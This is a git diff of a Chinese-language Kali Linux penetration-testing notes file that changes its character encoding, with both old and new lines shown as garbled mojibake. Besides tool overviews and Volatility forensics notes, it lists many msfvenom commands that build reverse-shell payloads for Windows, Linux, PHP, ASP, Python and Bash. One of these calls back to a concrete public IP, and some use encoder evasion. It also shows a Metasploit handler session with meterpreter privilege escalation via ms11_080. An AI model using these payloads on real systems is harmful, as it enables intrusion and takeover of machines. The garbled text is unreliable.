@@ -1,159 +1,159 @@
-Ò»¡¢¼ò½é
-1.ÏµÍ³°²×°
-2.ÅäÖÃ
-3.³£ÓÃ¹¤¾ß°²×°
-4.¹¤¾ß¼¯ËµÃ÷
-#01ĞÅÏ¢ËÑ¼¯¹¤¾ß¼¯
-·ÖÎªDNS·ÖÎö¡¢IDS/IPSÊ¶±ğ¡¢SMB·ÖÎö¡¢SMTP·ÖÎö¡¢SNMP·ÖÎö¡¢SSL·ÖÎö¡¢VoIP·ÖÎö¡¢VPN·ÖÎö¡¢´æ»îÖ÷»úÊ¶±ğ¡¢µç»°·ÖÎö¡¢·şÎñÖ¸ÎÆÊ¶±ğ¡¢Á÷ÀË·ÖÎö¡¢Â·ÓÉ·ÖÎö¡¢Çé±¨·ÖÎö¡¢ÏµÍ³Ö¸ÎÆÊ¶±ğ¹²15¸öĞ¡·ÖÀà£º
+ï»¿ä¸€ã€ç®€ä»‹
+1.ç³»ç»Ÿå®‰è£…
+2.é…ç½®
+3.å¸¸ç”¨å·¥å…·å®‰è£…
+4.å·¥å…·é›†è¯´æ˜
+#01ä¿¡æ¯æœé›†å·¥å…·é›†
+åˆ†ä¸ºDNSåˆ†æã€IDS/IPSè¯†åˆ«ã€SMBåˆ†æã€SMTPåˆ†æã€SNMPåˆ†æã€SSLåˆ†æã€VoIPåˆ†æã€VPNåˆ†æã€å­˜æ´»ä¸»æœºè¯†åˆ«ã€ç”µè¯åˆ†æã€æœåŠ¡æŒ‡çº¹è¯†åˆ«ã€æµæµªåˆ†æã€è·¯ç”±åˆ†æã€æƒ…æŠ¥åˆ†æã€ç³»ç»ŸæŒ‡çº¹è¯†åˆ«å…±15ä¸ªå°åˆ†ç±»ï¼š
 {
-DNS·ÖÎö°üº¬dnsdict6¡¢dnsenumµÈ12¸ö¹¤¾ß
-IDS/IPSÊ¶±ğ°üº¬fragrout¡¢fragrouter¡¢ftest¡¢lbd¡¢wafwOOfËÄ¸ö¹¤¾ß
-/*À©Õ¹---IDS/IPS
-IDS(intrusion detection system),¼´ÈëÇÖ¼ì²âÏµÍ³¡£ÊÇÒ»ÖÖ¶ÔÍøÂç´«Êä½øĞĞ¼´Ê±¼àÊÓ£¬ÔÚ·¢ÏÖ¿ÉÒÉ´«ÊäÊ±·¢³ö¾¯±¨»òÕß²ÉÈ¡Ö÷¶¯·´Ó¦´ëÊ©µÄÍøÂç°²È«Éè±¸¡£ËüÓëÆäËûÍøÂç°²È«Éè±¸µÄ²»Í¬Ö®´¦±ãÔÚÓÚ£¬IDSÊÇÒ»ÖÖ»ı¼«Ö÷¶¯µÄ°²È«·À»¤¼¼Êõ¡£
-IPS£¨Intrusion Prevention System£©¼´ÈëÇÖ·ÀÓùÏµÍ³¡£IPSÎ»ÓÚ·À»ğÇ½ºÍÍøÂçµÄÉè±¸Ö®¼ä¡£ÕâÑù£¬Èç¹û¼ì²âµ½¹¥»÷£¬IPS»áÔÚÕâÖÖ¹¥»÷À©É¢µ½ÍøÂçµÄÆäËüµØ·½Ö®Ç°×èÖ¹Õâ¸ö¶ñÒâµÄÍ¨ĞÅ¡£
+DNSåˆ†æåŒ…å«dnsdict6ã€dnsenumç­‰12ä¸ªå·¥å…·
+IDS/IPSè¯†åˆ«åŒ…å«fragroutã€fragrouterã€ftestã€lbdã€wafwOOfå››ä¸ªå·¥å…·
+/*æ‰©å±•---IDS/IPS
+IDS(intrusion detection system),å³å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚æ˜¯ä¸€ç§å¯¹ç½‘ç»œä¼ è¾“è¿›è¡Œå³æ—¶ç›‘è§†ï¼Œåœ¨å‘ç°å¯ç–‘ä¼ è¾“æ—¶å‘å‡ºè­¦æŠ¥æˆ–è€…é‡‡å–ä¸»åŠ¨ååº”æªæ–½çš„ç½‘ç»œå®‰å…¨è®¾å¤‡ã€‚å®ƒä¸å…¶ä»–ç½‘ç»œå®‰å…¨è®¾å¤‡çš„ä¸åŒä¹‹å¤„ä¾¿åœ¨äºï¼ŒIDSæ˜¯ä¸€ç§ç§¯æä¸»åŠ¨çš„å®‰å…¨é˜²æŠ¤æŠ€æœ¯ã€‚
+IPSï¼ˆIntrusion Prevention Systemï¼‰å³å…¥ä¾µé˜²å¾¡ç³»ç»Ÿã€‚IPSä½äºé˜²ç«å¢™å’Œç½‘ç»œçš„è®¾å¤‡ä¹‹é—´ã€‚è¿™æ ·ï¼Œå¦‚æœæ£€æµ‹åˆ°æ”»å‡»ï¼ŒIPSä¼šåœ¨è¿™ç§æ”»å‡»æ‰©æ•£åˆ°ç½‘ç»œçš„å…¶å®ƒåœ°æ–¹ä¹‹å‰é˜»æ­¢è¿™ä¸ªæ¶æ„çš„é€šä¿¡ã€‚
 
-¶şÕßµÄÇø±ğ£º
-ÈëÇÖ¼ì²âÏµÍ³×¢ÖØµÄÊÇÍøÂç°²È«×´¿öµÄ¼à¹Ü¡£ÈëÇÖ·ÀÓùÏµÍ³¹Ø×¢µÄÊÇ¶ÔÈëÇÖĞĞÎªµÄ¿ØÖÆ¡£
-ÈëÇÖ¼ì²âÏµÍ³ĞèÒª²¿ÊğÔÚÍøÂçÄÚ²¿µÄÖĞĞÄµã£¬ĞèÒªÄÜ¹»¹Û²ìµ½ËùÓĞÍøÂçÊı¾İ¡£ÈëÇÖ·ÀÓùÏµÍ³ĞèÒª²¿ÊğÔÚÍøÂçµÄ±ß½ç¡£
-ÈëÇÖ¼ì²âÏµÍ³µÄºËĞÄ¼ÛÖµÔÚÓÚÍ¨¹ı¶ÔÈ«ÍøĞÅÏ¢µÄ·ÖÎö£¬ÁË½âĞÅÏ¢ÏµÍ³µÄ°²È«×´¿ö£¬½ø¶øÖ¸µ¼ĞÅÏ¢ÏµÍ³°²È«½¨ÉèÄ¿±êÒÔ¼°°²È«²ßÂÔµÄÈ·Á¢ºÍµ÷Õû£¬¶øÈëÇÖ·ÀÓùÏµÍ³µÄºËĞÄ¼ÛÖµÔÚÓÚ°²È«²ßÂÔµÄÊµÊ©¡ª¶ÔºÚ¿ÍĞĞÎªµÄ×è»÷;ÈëÇÖ¼ì²âÏµÍ³ĞèÒª²¿ÊğÔÚÍøÂçÄÚ²¿£¬¼à¿Ø·¶Î§¿ÉÒÔ¸²¸ÇÕû¸ö×ÓÍø£¬°üÀ¨À´×ÔÍâ²¿µÄÊı¾İÒÔ¼°ÄÚ²¿ÖÕ¶ËÖ®¼ä´«ÊäµÄÊı¾İ£¬ÈëÇÖ·ÀÓùÏµÍ³Ôò±ØĞë²¿ÊğÔÚÍøÂç±ß½ç£¬µÖÓùÀ´×ÔÍâ²¿µÄÈëÇÖ£¬¶ÔÄÚ²¿¹¥»÷ĞĞÎªÎŞÄÜÎªÁ¦¡£
+äºŒè€…çš„åŒºåˆ«ï¼š
+å…¥ä¾µæ£€æµ‹ç³»ç»Ÿæ³¨é‡çš„æ˜¯ç½‘ç»œå®‰å…¨çŠ¶å†µçš„ç›‘ç®¡ã€‚å…¥ä¾µé˜²å¾¡ç³»ç»Ÿå…³æ³¨çš„æ˜¯å¯¹å…¥ä¾µè¡Œä¸ºçš„æ§åˆ¶ã€‚
+å…¥ä¾µæ£€æµ‹ç³»ç»Ÿéœ€è¦éƒ¨ç½²åœ¨ç½‘ç»œå†…éƒ¨çš„ä¸­å¿ƒç‚¹ï¼Œéœ€è¦èƒ½å¤Ÿè§‚å¯Ÿåˆ°æ‰€æœ‰ç½‘ç»œæ•°æ®ã€‚å…¥ä¾µé˜²å¾¡ç³»ç»Ÿéœ€è¦éƒ¨ç½²åœ¨ç½‘ç»œçš„è¾¹ç•Œã€‚
+å…¥ä¾µæ£€æµ‹ç³»ç»Ÿçš„æ ¸å¿ƒä»·å€¼åœ¨äºé€šè¿‡å¯¹å…¨ç½‘ä¿¡æ¯çš„åˆ†æï¼Œäº†è§£ä¿¡æ¯ç³»ç»Ÿçš„å®‰å…¨çŠ¶å†µï¼Œè¿›è€ŒæŒ‡å¯¼ä¿¡æ¯ç³»ç»Ÿå®‰å…¨å»ºè®¾ç›®æ ‡ä»¥åŠå®‰å…¨ç­–ç•¥çš„ç¡®ç«‹å’Œè°ƒæ•´ï¼Œè€Œå…¥ä¾µé˜²å¾¡ç³»ç»Ÿçš„æ ¸å¿ƒä»·å€¼åœ¨äºå®‰å…¨ç­–ç•¥çš„å®æ–½â€”å¯¹é»‘å®¢è¡Œä¸ºçš„é˜»å‡»;å…¥ä¾µæ£€æµ‹ç³»ç»Ÿéœ€è¦éƒ¨ç½²åœ¨ç½‘ç»œå†…éƒ¨ï¼Œç›‘æ§èŒƒå›´å¯ä»¥è¦†ç›–æ•´ä¸ªå­ç½‘ï¼ŒåŒ…æ‹¬æ¥è‡ªå¤–éƒ¨çš„æ•°æ®ä»¥åŠå†…éƒ¨ç»ˆç«¯ä¹‹é—´ä¼ è¾“çš„æ•°æ®ï¼Œå…¥ä¾µé˜²å¾¡ç³»ç»Ÿåˆ™å¿…é¡»éƒ¨ç½²åœ¨ç½‘ç»œè¾¹ç•Œï¼ŒæŠµå¾¡æ¥è‡ªå¤–éƒ¨çš„å…¥ä¾µï¼Œå¯¹å†…éƒ¨æ”»å‡»è¡Œä¸ºæ— èƒ½ä¸ºåŠ›ã€‚
 
-²Î¿¼£ºhttp://security.zdnet.com.cn/security_zone/2009/0412/1362627.shtml
+å‚è€ƒï¼šhttp://security.zdnet.com.cn/security_zone/2009/0412/1362627.shtml
 */
-smb·ÖÎö°üº¬acccheck¡¢nmap¡¢zenmap¡¢nbtscanµÈËÄ¸ö¹¤¾ß
+smbåˆ†æåŒ…å«acccheckã€nmapã€zenmapã€nbtscanç­‰å››ä¸ªå·¥å…·
 /*
-À©Õ¹---smbĞ­Òé
-SMBÊÇServer Message BlockµÄ¼òĞ´
-Õâ¸öĞ­ÒéÓÃÓÚ¹²ÏíÎÄ¼ş£¬¹²Ïí´òÓ¡»ú£¬¹²Ïí´®¿ÚµÈÓÃÍ¾¡£
-ÎÒÃÇÖ®ËùÒÔÄÜ¹»ÔÚwindowsµÄÍøÂçÁÚ¾ÓÏÂ·ÃÎÊÒ»¸öÓòÄÚµÄÆäËû»úÆ÷£¬¾ÍÊÇÍ¨¹ıÕâ¸öĞ­ÒéÊµÏÖµÄ¡£
-SMB Ğ­ÒéÊÇÒ»¸öºÜÖØÒªµÄĞ­Òé£¬Ä¿Ç°¾ø´ó¶àÊıµÄPCÉÏ¶¼ÔÚÔËĞĞÕâÒ»Ğ­Òé£¬windowsÏµÍ³¶¼³äµ±×ÅSMBĞ­ÒéµÄ¿Í»§¶ËºÍ·şÎñÆ÷£¬ËùÒÔSMBÊÇÒ»¸ö×ñÑ­¿Í»§»ú·ş/ÎñÆ÷Ä£Ê½µÄĞ­Òé¡£
-SMB·şÎñÆ÷¸ºÔğÍ¨¹ıÍøÂçÌá¹©¿ÉÓÃµÄ¹²Ïí×ÊÔ´¸øSMB¿Í»§»ú£¬·şÎñÆ÷ºÍ¿Í»§»úÖ®¼äÍ¨¹ıTCP/IPĞ­Òé¡¢»òÕßIPXĞ­Òé¡¢»òÕßÊÇ NetBEUI½øĞĞÁ¬½Ó¡£
+æ‰©å±•---smbåè®®
+SMBæ˜¯Server Message Blockçš„ç®€å†™
+è¿™ä¸ªåè®®ç”¨äºå…±äº«æ–‡ä»¶ï¼Œå…±äº«æ‰“å°æœºï¼Œå…±äº«ä¸²å£ç­‰ç”¨é€”ã€‚
+æˆ‘ä»¬ä¹‹æ‰€ä»¥èƒ½å¤Ÿåœ¨windowsçš„ç½‘ç»œé‚»å±…ä¸‹è®¿é—®ä¸€ä¸ªåŸŸå†…çš„å…¶ä»–æœºå™¨ï¼Œå°±æ˜¯é€šè¿‡è¿™ä¸ªåè®®å®ç°çš„ã€‚
+SMB åè®®æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„åè®®ï¼Œç›®å‰ç»å¤§å¤šæ•°çš„PCä¸Šéƒ½åœ¨è¿è¡Œè¿™ä¸€åè®®ï¼Œwindowsç³»ç»Ÿéƒ½å……å½“ç€SMBåè®®çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ï¼Œæ‰€ä»¥SMBæ˜¯ä¸€ä¸ªéµå¾ªå®¢æˆ·æœºæœ/åŠ¡å™¨æ¨¡å¼çš„åè®®ã€‚
+SMBæœåŠ¡å™¨è´Ÿè´£é€šè¿‡ç½‘ç»œæä¾›å¯ç”¨çš„å…±äº«èµ„æºç»™SMBå®¢æˆ·æœºï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·æœºä¹‹é—´é€šè¿‡TCP/IPåè®®ã€æˆ–è€…IPXåè®®ã€æˆ–è€…æ˜¯ NetBEUIè¿›è¡Œè¿æ¥ã€‚
 
-²Î¿¼£ºhttp://msdn.microsoft.com/en-us/library/cc246231.aspx
+å‚è€ƒï¼šhttp://msdn.microsoft.com/en-us/library/cc246231.aspx
 */
 SMTP
 SNMP
-SSL·ÖÎö
+SSLåˆ†æ
 VoIP
 /*
-À©Õ¹¡ªVoIP¼ò½é
+æ‰©å±•â€”VoIPç®€ä»‹
 
-VoIPÊÇ Voice over Internet ProtocolµÄËõĞ´
-Ö¸µÄÊÇ½«Ä£ÄâµÄÉùÒôÑ¶ºÅ¾­¹ıÑ¹ËõÓë·â°üÖ®ºó£¬ÒÔÊı¾İ·â°üµÄĞÎÊ½ÔÚIP ÍøÂçµÄ»·¾³½øĞĞÓïÒôÑ¶ºÅµÄ´«Êä
-Í¨Ë×À´ËµÒ²¾ÍÊÇ»¥ÁªÍøµç»°¡¢ÍøÂçµç»°»òÕß¼ò³ÆIPµç»°µÄÒâË¼¡£
+VoIPæ˜¯ Voice over Internet Protocolçš„ç¼©å†™
+æŒ‡çš„æ˜¯å°†æ¨¡æ‹Ÿçš„å£°éŸ³è®¯å·ç»è¿‡å‹ç¼©ä¸å°åŒ…ä¹‹åï¼Œä»¥æ•°æ®å°åŒ…çš„å½¢å¼åœ¨IP ç½‘ç»œçš„ç¯å¢ƒè¿›è¡Œè¯­éŸ³è®¯å·çš„ä¼ è¾“
+é€šä¿—æ¥è¯´ä¹Ÿå°±æ˜¯äº’è”ç½‘ç”µè¯ã€ç½‘ç»œç”µè¯æˆ–è€…ç®€ç§°IPç”µè¯çš„æ„æ€ã€‚
 
-²Î¿¼×ÊÁÏ£ºhttps://www.cisco.com/application/pdf/en/us/guest/tech/tk587/c1506/ccmigration_09186a008012dd36.pdf*/
+å‚è€ƒèµ„æ–™ï¼šhttps://www.cisco.com/application/pdf/en/us/guest/tech/tk587/c1506/ccmigration_09186a008012dd36.pdf*/
 }
 #02
 
-¶ş¡¢³£ÓÃÃüÁî
+äºŒã€å¸¸ç”¨å‘½ä»¤
 
-Èı¡¢ĞÅÏ¢ÊÕ¼¯
+ä¸‰ã€ä¿¡æ¯æ”¶é›†
 
-ËÄ¡¢Â©¶´É¨Ãè
-1.nmapÊ¹ÓÃ
+å››ã€æ¼æ´æ‰«æ
+1.nmapä½¿ç”¨
 
 
 
-Îå¡¢Â©¶´ÀûÓÃ
-£¨Ò»£©MSF
-1.°²×°ÅäÖÃ
-metasploitÒ»¿î¿ªÔ´µÄ°²È«Â©¶´¼ì²â¹¤¾ß£¬Â©¶´ÀûÓÃÆ½Ì¨
-	¹ÙÍø£ºhttps://www.metasploit.com/
-	ÏÂÔØ£ºhttps://www.rapid7.com/products/metasploit/download.jsp
-Kali°²×°vmware tools£º
+äº”ã€æ¼æ´åˆ©ç”¨
+ï¼ˆä¸€ï¼‰MSF
+1.å®‰è£…é…ç½®
+metasploitä¸€æ¬¾å¼€æºçš„å®‰å…¨æ¼æ´æ£€æµ‹å·¥å…·ï¼Œæ¼æ´åˆ©ç”¨å¹³å°
+	å®˜ç½‘ï¼šhttps://www.metasploit.com/
+	ä¸‹è½½ï¼šhttps://www.rapid7.com/products/metasploit/download.jsp
+Kaliå®‰è£…vmware toolsï¼š
 	http://jingyan.baidu.com/article/624e745952508c34e8ba5aca.html
 	http://jingyan.baidu.com/article/e75057f2de5792ebc81a894c.html
 
-2.³£¼ûÃüÁî
+2.å¸¸è§å‘½ä»¤
 
-3.ÌáÈ¨Ë¼Â·
-WebshellÌáÈ¨²½Öè
-µÚÒ»²½£ºÉú³É·´µ¯½Å±¾»òÖ´ĞĞÎÄ¼ş
+3.ææƒæ€è·¯
+Webshellææƒæ­¥éª¤
+ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆåå¼¹è„šæœ¬æˆ–æ‰§è¡Œæ–‡ä»¶
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=49.210.187.182 LPORT=4444 -f exe -o /root/door.exe
-Éú³ÉÖ´ĞĞÎÄ¼şdoor.exe °ó¶¨µØÖ·£º49.210.187.182:4444
-ÓÉÓÚÂ·ÓÉÆ÷ÉèÖÃÁË¶Ë¿Ú×ª·¢£¬½«4444¶Ë¿Ú×ª·¢ÖÁ192.168.1.111
+ç”Ÿæˆæ‰§è¡Œæ–‡ä»¶door.exe ç»‘å®šåœ°å€ï¼š49.210.187.182:4444
+ç”±äºè·¯ç”±å™¨è®¾ç½®äº†ç«¯å£è½¬å‘ï¼Œå°†4444ç«¯å£è½¬å‘è‡³192.168.1.111
 
-µÚ¶ş²½£º¼ÓÔØmsf£¬¼àÌı·´µ¯½á¹û
-	use exploit/multi/handler ÉèÖÃ½ÓÊÜ·´µ¯Ä£¿é
-	set payload windows/meterpreter/reverse_tcp ÉèÖÃ·´µ¯½á¹û´¦ÀíÔØºÉ
-	show options ²é¿´ÅäÖÃÑ¡Ïî
-	Show targets ²é¿´¹¥»÷Ä¿±ê
-	set LHOST 192.168.1.111 ÉèÖÃ±¾µØ¼àÌıµØÖ·192.168.1.111
-	exploit Ö´ĞĞ
+ç¬¬äºŒæ­¥ï¼šåŠ è½½msfï¼Œç›‘å¬åå¼¹ç»“æœ
+	use exploit/multi/handler è®¾ç½®æ¥å—åå¼¹æ¨¡å—
+	set payload windows/meterpreter/reverse_tcp è®¾ç½®åå¼¹ç»“æœå¤„ç†è½½è·
+	show options æŸ¥çœ‹é…ç½®é€‰é¡¹
+	Show targets æŸ¥çœ‹æ”»å‡»ç›®æ ‡
+	set LHOST 192.168.1.111 è®¾ç½®æœ¬åœ°ç›‘å¬åœ°å€192.168.1.111
+	exploit æ‰§è¡Œ
  
-µÚÈı²½£º½ÓÊÜ·´µ¯£¬½øĞĞÌáÈ¨²Ù×÷
-	meterpreter > getuid £¨»ñÈ¡µ±Ç°È¨ÏŞ£©
+ç¬¬ä¸‰æ­¥ï¼šæ¥å—åå¼¹ï¼Œè¿›è¡Œææƒæ“ä½œ
+	meterpreter > getuid ï¼ˆè·å–å½“å‰æƒé™ï¼‰
 		Server username: NT AUTHORITY\NETWORK SERVICE
-	meterpreter > getsystem £¨³¢ÊÔÌáÈ¨²Ù×÷£©
+	meterpreter > getsystem ï¼ˆå°è¯•ææƒæ“ä½œï¼‰
 		[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
 		[-] Named Pipe Impersonation (In Memory/Admin)
 		[-] Named Pipe Impersonation (Dropper/Admin)
 		[-] Token Duplication (In Memory/Admin)
-	meterpreter > background £¨·µ»Ø Ñ¡ÔñÌáÈ¨exp£©
+	meterpreter > background ï¼ˆè¿”å› é€‰æ‹©ææƒexpï¼‰
 		[*] Backgrounding session 1...
-	msf exploit(handler) > use exploit/windows/local/ms11_080_afdjoinleaf  (Ñ¡ÔñÌáÈ¨exp)
-	msf exploit(ms11_080_afdjoinleaf) > set session 1 £¨ÔØÈëµ±Ç°·´µ¯shell£©
+	msf exploit(handler) > use exploit/windows/local/ms11_080_afdjoinleaf  (é€‰æ‹©ææƒexp)
+	msf exploit(ms11_080_afdjoinleaf) > set session 1 ï¼ˆè½½å…¥å½“å‰åå¼¹shellï¼‰
 		session => 1
-	msf exploit(ms11_080_afdjoinleaf) > exploit £¨Ö´ĞĞ£©
+	msf exploit(ms11_080_afdjoinleaf) > exploit ï¼ˆæ‰§è¡Œï¼‰
 
-4.Éú³É·´µ¯½Å±¾
+4.ç”Ÿæˆåå¼¹è„šæœ¬
 MSF Payloads
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
 	ms fvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
 
-MSF Éú³ÉÔÚ Linux ÏÂ·´µ¯µÄ Meterpreter Shell
+MSF ç”Ÿæˆåœ¨ Linux ä¸‹åå¼¹çš„ Meterpreter Shell
 	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
-MSF Éú³É·´µ¯ Shell (C Shellcode)
+MSF ç”Ÿæˆåå¼¹ Shell (C Shellcode)
 	msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
-MSF Éú³É·´µ¯ Python Shell
+MSF ç”Ÿæˆåå¼¹ Python Shell
 	msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
-MSF Éú³É·´µ¯ ASP Shell
+MSF ç”Ÿæˆåå¼¹ ASP Shell
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform win -o shell.asp
 	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform windows -o /root/shell.asp
-MSF Éú³É·´µ¯ Bash Shell
+MSF ç”Ÿæˆåå¼¹ Bash Shell
 	msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
-MSF Éú³É·´µ¯ PHP Shell
+MSF ç”Ÿæˆåå¼¹ PHP Shell
 	msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
 	add <?php at the beginning
 	perl -i~ -0777pe's/^/<?php \n/' shell.php
-MSF Éú³É·´µ¯ Win Shell
+MSF ç”Ÿæˆåå¼¹ Win Shell
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
 
-5.³£¼ûÎÊÌâ
-1)ÍøÂçÎÊÌâ£¨ÄÚÍøÎÊÌâ£©
-	²¦ºÅÉÏÍø=>´úÀíÉÏÍø
-	Â·ÓÉÆ÷ÉÏÍø=>ÉèÖÃÂ·ÓÉÆ÷¶Ë¿Ú×ª·¢
-	ÉèÖÃ¶Ë¿Ú4444µÄÁ÷Á¿×ª·¢ÖÁ192.168.1.111ÉÏ
+5.å¸¸è§é—®é¢˜
+1)ç½‘ç»œé—®é¢˜ï¼ˆå†…ç½‘é—®é¢˜ï¼‰
+	æ‹¨å·ä¸Šç½‘=>ä»£ç†ä¸Šç½‘
+	è·¯ç”±å™¨ä¸Šç½‘=>è®¾ç½®è·¯ç”±å™¨ç«¯å£è½¬å‘
+	è®¾ç½®ç«¯å£4444çš„æµé‡è½¬å‘è‡³192.168.1.111ä¸Š
  
-2)·´µ¯ÎÊÌâ
-	½Å±¾²»Ö§³Ösocket
-	·À»¤Èí¼ş
-	²ÉÓÃcdn¼ÓËÙ
+2)åå¼¹é—®é¢˜
+	è„šæœ¬ä¸æ”¯æŒsocket
+	é˜²æŠ¤è½¯ä»¶
+	é‡‡ç”¨cdnåŠ é€Ÿ
 	
-3)ÆäËû
+3)å…¶ä»–
 
 
-Áù¡¢È¨ÏŞÌáÉı
+å…­ã€æƒé™æå‡
 
-Æß¡¢ÃÜÂë¹¥»÷
+ä¸ƒã€å¯†ç æ”»å‡»
 
-°Ë¡¢wifiÆÆ½â
+å…«ã€wifiç ´è§£
 
-¾Å¡¢Êı×ÖÈ¡Ö¤
+ä¹ã€æ•°å­—å–è¯
 1.binwalk
 
 
 2.Volatility
-#01¼ò½é
+#01ç®€ä»‹
 {
-VolatilityÊÇ¿ªÔ´µÄWindows£¬Linux£¬MaC£¬AndroidµÄÄÚ´æÈ¡Ö¤·ÖÎö¹¤¾ß£¬ÓÉpython±àĞ´³É£¬ÃüÁîĞĞ²Ù×÷£¬Ö§³Ö¸÷ÖÖ²Ù×÷ÏµÍ³¡£
-ÏîÄ¿µØÖ·£º
+Volatilityæ˜¯å¼€æºçš„Windowsï¼ŒLinuxï¼ŒMaCï¼ŒAndroidçš„å†…å­˜å–è¯åˆ†æå·¥å…·ï¼Œç”±pythonç¼–å†™æˆï¼Œå‘½ä»¤è¡Œæ“ä½œï¼Œæ”¯æŒå„ç§æ“ä½œç³»ç»Ÿã€‚
+é¡¹ç›®åœ°å€ï¼š
 	https://code.google.com/p/volatility/
-Ö»½éÉÜ¼òµ¥µÄÊ¹ÓÃ£¬ÏêÏ¸Ê¹ÓÃ·½·¨¿ÉÒÔ¿´CheatSheet¡£ÔÚ¹Ù·½ÍøÕ¾°üº¬LinuxµÄÏà¹ØÃüÁî²Î¿¼£º
+åªä»‹ç»ç®€å•çš„ä½¿ç”¨ï¼Œè¯¦ç»†ä½¿ç”¨æ–¹æ³•å¯ä»¥çœ‹CheatSheetã€‚åœ¨å®˜æ–¹ç½‘ç«™åŒ…å«Linuxçš„ç›¸å…³å‘½ä»¤å‚è€ƒï¼š
 	https://code.google.com/p/volatility/wiki/LinuxCommandReference23#linux_pidhashtable
-º¬ÒÔÏÂÄÚÈİ
+å«ä»¥ä¸‹å†…å®¹
 	Processes
 	linux_pslist
 	linux_psaux
@@ -202,122 +202,122 @@ VolatilityÊÇ¿ªÔ´µÄWindows£¬Linux£¬MaC£¬AndroidµÄÄÚ´æÈ¡Ö¤·ÖÎö¹¤¾ß£¬ÓÉpython±àĞ´³É
 	linux_volshell
 	linux_yarascan
 
-#02°²×°
-Ô´´úÂë°²×°·½·¨£º
+#02å®‰è£…
+æºä»£ç å®‰è£…æ–¹æ³•ï¼š
 	apt-get install subversion-tools
 	svn checkout http://volatility.googlecode.com/svn/trunk/ /usr/local/src/volatility/
-²Î¿¼£º
+å‚è€ƒï¼š
 	https://code.google.com/p/volatility/wiki/VolatilityInstallation
-Back TrackºÍKali LinuxÖĞ×Ô´ø´Ë³ÌĞò¡£ÒÔKali-LinuxÎªÀı£¬volatilityÔÚ¡°Ó¦ÓÃ³ÌĞò¡±-¡°Kali Linux¡±-¡°Êı×ÖÈ¡Ö¤¡±-¡°ÄÚ´æÈ¡Ö¤¹¤¾ß¼¯¡±ÖĞ¡£
+Back Trackå’ŒKali Linuxä¸­è‡ªå¸¦æ­¤ç¨‹åºã€‚ä»¥Kali-Linuxä¸ºä¾‹ï¼Œvolatilityåœ¨â€œåº”ç”¨ç¨‹åºâ€-â€œKali Linuxâ€-â€œæ•°å­—å–è¯â€-â€œå†…å­˜å–è¯å·¥å…·é›†â€ä¸­ã€‚
 
-#03»ù±¾Ê¹ÓÃÃüÁî
-	./vol.py ©\f [image] -©\profile=[profile] [plugin]
-Ó¦¸ÃÊÇÒ»¸öBug£¬-fºóÃæĞèÒª¸ú¾ø¶ÔÂ·¾¶£¨Kali£©¡£
+#03åŸºæœ¬ä½¿ç”¨å‘½ä»¤
+	./vol.py â€f [image] -â€profile=[profile] [plugin]
+åº”è¯¥æ˜¯ä¸€ä¸ªBugï¼Œ-fåé¢éœ€è¦è·Ÿç»å¯¹è·¯å¾„ï¼ˆKaliï¼‰ã€‚
 
-    ²é¿´É¨Ãè¼ì²é¡¢²å¼ş¡¢µØÖ·¿Õ¼äµÈĞÅÏ¢
+    æŸ¥çœ‹æ‰«ææ£€æŸ¥ã€æ’ä»¶ã€åœ°å€ç©ºé—´ç­‰ä¿¡æ¯
 
     ./vol.py --info
 
-    ²é¿´°ïÖúĞÅÏ¢
+    æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯
 
     ./vol.py -h/--help
 
-    ²é¿´Ö¸¶¨²å¼şµÄËµÃ÷
+    æŸ¥çœ‹æŒ‡å®šæ’ä»¶çš„è¯´æ˜
 
     ./vol.py [plugin] --help
 
-    ´ÓÀ©Õ¹Ä¿Â¼¼ÓÔØ²å¼ş
+    ä»æ‰©å±•ç›®å½•åŠ è½½æ’ä»¶
 
     ./vol.py --plugins=[path][plugin]
 
-    ¼ì²é½á¹ûÊä³ö
+    æ£€æŸ¥ç»“æœè¾“å‡º
 
     ./vol.py --output-file=[file]
 
-#04ÖÆ×÷LinuxÏµÍ³µÄProfile
-Volatility×Ô´øÒ»Ğ©windowsÏµÍ³µÄprofile£¬LinuxÏµÍ³µÄProfileĞèÒª×Ô¼ºÖÆ×÷£¬ÖÆ×÷µÄ·½·¨ÈçÏÂ£º
-£¨Êµ¼ÊÊÇ½«module.dwarfºÍsystem.map´ò°ü³ÉÒ»¸özipÎÄ¼ş£¬½Ó×Å½«zipÎÄ¼şÒÆ¶¯µ½ volatility/plugins/overlays/linux/ ÖĞ¡££©
-LinuxµÄProfileÎÄ¼şÊÇÒ»¸özipµÄÑ¹Ëõ°ü¡£
-×¼±¸
+#04åˆ¶ä½œLinuxç³»ç»Ÿçš„Profile
+Volatilityè‡ªå¸¦ä¸€äº›windowsç³»ç»Ÿçš„profileï¼ŒLinuxç³»ç»Ÿçš„Profileéœ€è¦è‡ªå·±åˆ¶ä½œï¼Œåˆ¶ä½œçš„æ–¹æ³•å¦‚ä¸‹ï¼š
